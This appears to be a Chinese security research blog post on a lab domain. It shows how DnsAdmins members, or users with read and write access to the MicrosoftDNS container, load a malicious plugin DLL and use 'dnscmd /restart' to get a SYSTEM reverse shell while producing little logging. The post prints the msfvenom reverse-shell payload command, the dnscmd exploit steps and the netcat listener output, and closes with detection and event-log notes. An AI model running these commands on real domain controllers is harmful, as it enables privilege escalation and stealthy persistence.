# 基于dnsadmin的dns热重载后门权限维持-先知社区

> **来源**: https://xz.aliyun.com/news/18703  
> **文章ID**: 18703

---

## 本文所使用环境

这篇环境当中，我使用的是我自建靶机[bicker](https://www.wackymaker.com/post/bicher-%E8%87%AA%E5%BB%BA/),其中tindalos就是dnsadmin组

## 本文阅读前置介绍

dnsadmin作为域渗透中的一个常见提权思路，网上的文章已经有很多了，但是普遍是你抄我我抄你，大部分都是一个模板套出来的，其原因也很简单,最容易枚举到的是[nairuzabulhul](https://medium.com/r3d-buck3t/escalating-privileges-with-dnsadmins-group-active-directory-6f7adbc7005b)的这篇博客，而那些“一般文章”普遍都是刻着它的模板，按照他们的解释来看，只要是dnsadmin组就允许执行以下操作进行提权

1. 利用dnscmd.exe给dns的组件serverlevelplugindll注册恶意后门dll
2. 监听shell
3. 利用sc.exe重启服务，在服务重启的时候dns会加载恶意dll并回弹system权限shell

当然，在准备详细研究之前我也是这么觉得的，但是当我们真正配置了一个dnsadmin组则会发现dnsadmin组其实默认并不具备重启服务的权限

```
evil-winrm-py PS C:\Users\tindalos\Documents> whoami /all


用户信息
----------------


用户名          SID                                         
=============== ============================================
bicker\tindalos S-1-5-21-298176814-2846777796-698167141-1103


组信息
-----------------


组名                                        类型   SID                                          属性                                  
=========================================== ====== ============================================ ======================================
Everyone                                    已知组 S-1-1-0                                      必需的组, 启用于默认, 启用的组        
BUILTIN\Remote Desktop Users                别名   S-1-5-32-555                                 必需的组, 启用于默认, 启用的组        
BUILTIN\Remote Management Users             别名   S-1-5-32-580                                 必需的组, 启用于默认, 启用的组        
BUILTIN\Users                               别名   S-1-5-32-545                                 必需的组, 启用于默认, 启用的组        
BUILTIN\Pre-Windows 2000 Compatible Access  别名   S-1-5-32-554                                 必需的组, 启用于默认, 启用的组        
NT AUTHORITY\NETWORK                        已知组 S-1-5-2                                      必需的组, 启用于默认, 启用的组        
NT AUTHORITY\Authenticated Users            已知组 S-1-5-11                                     必需的组, 启用于默认, 启用的组        
NT AUTHORITY\This Organization              已知组 S-1-5-15                                     必需的组, 启用于默认, 启用的组        
BICKER\DnsAdmins                            别名   S-1-5-21-298176814-2846777796-698167141-1101 必需的组, 启用于默认, 启用的组, 本地组
NT AUTHORITY\NTLM Authentication            已知组 S-1-5-64-10                                  必需的组, 启用于默认, 启用的组        
Mandatory Label\Medium Plus Mandatory Level 标签   S-1-16-8448                                                                        


特权信息
----------------------


特权名                        描述             状态  
============================= ================ ======
SeMachineAccountPrivilege     将工作站添加到域 已启用
SeChangeNotifyPrivilege       绕过遍历检查     已启用
SeIncreaseWorkingSetPrivilege 增加进程工作集   已启用


用户声明信息
-----------------------


用户声明未知。


已在此设备上禁用对动态访问控制的 Kerberos 支持。
evil-winrm-py PS C:\Users\tindalos\Documents> sc.exe stop dns
[SC] OpenService 失败 5:


拒绝访问。


evil-winrm-py PS C:\Users\tindalos\Documents>
```

这意味着如果进入实战环境或者远程靶机环境，没有配置服务管理权限的dnsadmin将很难利用（无重启特权）

## dnsadmin热重载

为了找寻如何在仅仅使用dnsadmin组权限进行服务重启类似效果时，我查看了[MS-DNSP](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-dnsp/f97756c9-3783-428b-9451-b376f877319a)的文档，我查找到了这一行

```
§If pszOperation is Restart, the server MUST restart the DNS server, and return success.
```

文档中显示的结果就是服务器在R\_DnssrvOperation中接受的命令有restart这个值，也意味着确实存在重启选项

于是我查看dnscmd[dnscmd](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/dnscmd)的文档，但是当我搜索restart的时候一无所获，走头无路的我找到了[Yuval Gordon](https://www.semperis.com/blog/dnsadmins-revisited/)的文章(事实上后续的研究我参考了他很多，感谢前人)，发现他找到了dnscmd存在/restart参数，当我尝试后，它真的成功了

```
#这里我使用的rev.dll为：msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.174.129 LPORT=443 -f dll -o rev.dll
evil-winrm-py PS C:\users\tindalos> dnscmd.exe /config /serverlevelplugindll C:\wirteTEMP\rev.dll


注册属性 serverlevelplugindll 成功重置。
命令成功完成。


evil-winrm-py PS C:\users\tindalos> dnscmd.exe /restart


. 已成功完成。
命令成功完成。


```

```
└─$ nc -lnvp 443
listening on [any] 443 ...
connect to [192.168.174.129] from (UNKNOWN) [192.168.174.143] 54728
Microsoft Windows [°汾 10.0.20348.169]
(c) Microsoft Corporation¡£±£´̹ԐȨ{¡£


C:\Windows\system32>
```

这令我有点意外，因为我不理解为何它能重启服务，并且它并不在微软的文档当中，于是我对dnsadmin以及dnscmd的使用进行了研究

这种不利用sc执行的攻击类似于热重载，其本质上与服务重启的含义并不同，导致的效果也并不同，如果你对这块内容感兴趣，可以跳到本文章的 /restart优点和缺点

## dnsadmin组权限解析及结论

我们登陆环境当中的域管理并筛选dnsadmin对MicrosoftDNS容器的控制权限可以看到基本上就是通用all权限

```
dsacls "CN=MicrosoftDNS,CN=System,DC=bicker,DC=com"


允许 BICKER\DnsAdmins   特殊访问
    DELETE
    READ PERMISSONS
    WRITE PERMISSIONS
    CHANGE OWNERSHIP
    CREATE CHILD
    DELETE CHILD
    LIST CONTENTS
    WRITE SELF
    WRITE PROPERTY
    READ PROPERTY
    DELETE TREE
    CONTROL ACCESS
```

我们尝试创建一个域用户且添加远程管理和对MicrosoftDNS的通用写入和读取

```
evil-winrm-py PS C:\Users\Administrator\Documents> New-ADUser -Name "dns-test" -SamAccountName "dns-test" -AccountPassword (ConvertTo-S
ecureString "P@ssw0rd!" -AsPlainText -Force) -Enabled $true
evil-winrm-py PS C:\Users\Administrator\Documents> Add-ADGroupMember -Identity "Remote Management Users" -Members "dns-test"
evil-winrm-py PS C:\Users\Administrator\Documents> dsacls "CN=MicrosoftDNS,CN=System,DC=bicker,DC=com" /G "BICKER\dns-test:GRGW"
```

修改完毕后列出，可以看到dns-test用户并没有完全添加通用写入和通用读取，这可能是因为AD 对象类型限制，毕竟MicrosoftDNS本质上属于容器，域环境应该会阻止对其写入通用写入权限（这是我的猜测，其并不准确，我会在后续有时间的时候继续探讨这个问题）

```
允许 BICKER\dns-test  特殊访问
   READ PERMISSIONS #通用读取
   LIST CONTENTS #列出内容
   WRITE SELF #写入自身
   WRITE PROPERTY #属性写入
   READ PROPERTY #属性读取
   LIST OBJECT #列出对象
```

当我们登陆这个用户并尝试执行和之前tindalos用户（属于dnsadmin组）通用的加载权限的时候，令我惊讶的事情发生了，这个不在dnsadmin组当中的用户毫无阻碍的将system权限shell弹了回来

```
evil-winrm-py PS C:\users\dns-test> dnscmd.exe /config /serverlevelplugindll C:\wirteTEMP\rev.dll


注册属性 serverlevelplugindll 成功重置。
命令成功完成。


evil-winrm-py PS C:\users\dns-test> dnscmd.exe /restart


. 已成功完成。
命令成功完成。


```

```
└─$ nc -lnvp 443
listening on [any] 443 ...
connect to [192.168.174.129] from (UNKNOWN) [192.168.174.143] 55669
Microsoft Windows [°汾 10.0.20348.169]
(c) Microsoft Corporation¡£±£´̹ԐȨ{¡£


C:\Windows\system32>


```

所以这里我意识到，只要我们对dns容器存在读取写入权限，我们就能利用热重载进行攻击

于是我又测试了仅仅给dns-test给予属性读写，看他能否操作热重载

```
允许 BICKER\dns-test  特殊访问
   WRITE PROPERTY #属性写入
   READ PROPERTY #属性读取


evil-winrm-py PS C:\wirteTEMP> dnscmd.exe /config /serverlevelplugindll C:\wirteTEMP\rev.dll


DNS 服务器未能重置注册属性。
    状态 = 5 (0x00000005)
命令失败:  ERROR_ACCESS_DENIED     5    0x5
```

失败是正常的，单一的属性读取并不足以dnscmd进行认证

所以现在可以给出现阶段的研究结论了:

执行热重载dns劫持并不一定需要成为dnsadmin组，而只需要对MicrosoftDNS容器的通用读取权限以及写入属性权限（[Yuval Gordon](https://www.semperis.com/blog/dnsadmins-revisited/)文章指出需要通用写入以及通用读取，在以上的测试中我发现通用写入并不一定需要且配置起来比较困难，所以读取属性权限就够了），以及对dc的rpc访问权限即可（域用户即可）

## 攻击路径检测难度

那么这种不再dnsadmin组中却对dns容器存在acl的情况是否容易检测呢？

通过猎犬，我们可以看到用户没有出站，针对性查找也无法查找，这很正常

猎犬只抓取如下信息

```
用户（User）
组（Group）
计算机（Computer）
OU（组织单位）
域（Domain）
GPO（组策略对象）
```

而MicrosoftDNS属于system容器，容器(Container)默认是不会被抓取的，因为它不是常规的 OU 或对象类型，正常的hound只扫描标准AD-ACL。

但是powerview的高危筛选就能清晰的筛选出来

```
evil-winrm-py PS C:\wirteTEMP>. .\PowerView.ps1
evil-winrm-py PS C:\wirteTEMP> Find-InterestingDomainAcl -ResolveGUIDs


ObjectDN                : CN=MicrosoftDNS,CN=System,DC=bicker,DC=com
AceQualifier            : AccessAllowed
ActiveDirectoryRights   : Self, WriteProperty, GenericRead
ObjectAceType           : None
AceFlags                : None
AceType                 : AccessAllowed
InheritanceFlags        : None
SecurityIdentifier      : S-1-5-21-298176814-2846777796-698167141-3601
IdentityReferenceName   : dns-test
IdentityReferenceDomain : bicker.com
IdentityReferenceDN     : CN=dns-test,CN=Users,DC=bicker,DC=com
IdentityReferenceClass  : user


```

所以在这种情况下只能利用利用rast模块本地枚举或者powerview

## /restart优点和缺点

当我们利用热重载进行攻击过后，查看dns的日志文件，发现仅存在事件

事件ID770（已加载服务器级插件 DLL）事件ID140，而正常的服务重启会产生7035(服务重启)，7036(服务状态更改)等事件，这些事件无一例外的都会产生大量“噪音”

为何利用/restart操作会这样呢，其实问题藏在事件ID140报错当中（rpc终结点重复）

DNS管理面是通过RPC终结点对外提供接口的。一个服务在对外“开门”前，会先注销旧终结点，再注册新终结点，无论是正常重启还是内部重载，代码层面都去调了“注销终结点”的同一个 API，但这个注销动作失败了，可以这么理解

1. 正常重启：原理是服务进程会退出，重新启动一个新进程，在退出进程前服务注销失败，但进程马上退出。进程一退出，RPC运行时会自动清理它的终结点注册，所以不会留下脏状态；新进程再起来，顺利注册，没有后续错误。
2. 内部重载（/Restart）:同一个进程里调用内部函数reloadShutdown，把组件“关—再开”，不退出进程。类似“热重载”但是进程并未重启。所以注销失败后，旧的终结点还挂着；接着重载流程又去注册相同的终结点，于是 RPC 端点映射器发现“这玩意儿已经有了”，报 140事件错误

从这件事件可以看出热重载和服务重启的区别

1. 服务重启会产生大量日志报告，且需要服务重启权限，一般需要域管理或者server2019前存在的默认组服务操作员等权限，或者更彻底一点，直接等待机器重启，但是重启后并不会导致dns管理平台失控，还是正常允许我们撤销dll痕迹清楚
2. 热重载“噪音小”且只需要dnsadmin或者容器读写权限即可单独操作，但是会导致140错误，在机器下次重启之前dns管理平台会死机，这个进程将不再允许dns管理控制台的介入，dnscmd也无法进行下一步工作

## 感谢

本拙略冗长的文章就到此结束了，在这次研究中我还是有很多底层或者权限理解并未搞清楚，会在之后继续学习，并分享出来，感谢以下文章以及人员的帮助

[Yuval Gordon](https://www.semperis.com/blog/dnsadmins-revisited/)的文章是我这篇文章的基础

感谢IPv32 乔.九九.☆.0/24的帮助，这篇文章的由来也是因为他对我的靶机产生了非预期解（笑哭）
